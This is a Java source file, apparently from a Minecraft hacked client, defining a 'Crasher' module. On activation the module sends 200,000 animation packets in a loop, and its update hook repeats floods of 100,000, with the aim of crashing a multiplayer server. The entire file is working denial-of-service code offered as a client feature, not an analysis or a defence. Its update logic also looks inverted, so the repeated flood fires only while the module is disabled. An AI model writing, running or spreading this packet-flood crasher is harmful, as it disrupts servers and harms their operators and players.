package neko.module.modules.misc;

import neko.module.Category;
import neko.module.Module;
import neko.utils.Utils;
import net.minecraft.network.play.client.C0APacketAnimation;

public class Crasher extends Module {
	
	int loop;
	public static boolean active;
	
	public Crasher() {
		super("Crasher", -1, Category.MISC);
	}
	
	public void onEnabled() {		
		this.active = true;
		int spam = 0;
		while (spam < 200000) {
			mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
			++spam;
		}
		Utils.addChat("§6Veuillez patienter... Nous essayons le crash.");
		super.onEnabled();
	}
	
	public void onDisabled() {
		this.active = false;
		super.onDisabled();
	}	

	public void setValues() {
		this.values = "";
	}
	
	@Override
	public void onUpdate() {
		if (this.active)
			return;
		++this.loop;
		if (this.loop > 6) {
			int spam = 0;
			while (spam < 100000) {
				mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
				++spam;
				this.loop = 0;
			}
			super.onUpdate();
		}
	}
	
}
